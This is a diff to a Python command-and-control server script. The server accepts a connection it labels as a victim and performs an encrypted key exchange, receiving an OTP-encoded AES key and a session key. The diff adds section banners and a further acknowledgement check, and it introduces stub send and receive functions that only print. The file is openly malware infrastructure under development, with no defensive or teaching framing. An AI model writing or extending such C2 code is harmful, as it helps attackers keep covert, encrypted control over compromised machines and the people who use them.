@@ -18,6 +18,12 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.listen(1)
     conn, addr = sock.accept()
     with conn:
+        ######################################################################################
+        ######################################################################################
+        #               BEGIN CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                    #
+        ######################################################################################
+        ######################################################################################
+        
         print("C2 Server >> Victim",addr,'connected')
         OTPPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
         if(conn.send(b"\x01") != 1):
@@ -32,12 +38,27 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         conn.send(OTPencodedAESKey);
         # initiate the session key
         SessionKeyPacketLen = int.from_bytes(conn.recv(8),byteorder='big',signed=False)
-        print(str(hex( SessionKeyPacketLen )));
         if(conn.send(b"\x01") != 1):
             print("An error has occured in this connection before the EncryptedOTP could be recieved");
             sys.exit(-1)
         EncryptedKey = conn.recv(SessionKeyPacketLen)
         SessionKey = cipher.decrypt(EncryptedKey,"failed")
-      
+        if(conn.send(b"\x01") != 1):
+            print("An error has occured in this connection before the EncryptedOTP could be recieved");
+            sys.exit(-1)
+        def secure_send():
+            print ("send data")
+
+        def secure_recv():
+            print ("recv data") 
+        ######################################################################################
+        ######################################################################################
+        #               END CONFIGURATION ITEMS FOR SERVER FUCTIONALITY                      #
+        ######################################################################################
+        ######################################################################################
+        #               BEGIN SERVER/CLIENT COMMUNICATION ROUTINE                            #
+        ######################################################################################
+        ######################################################################################
+
 
 
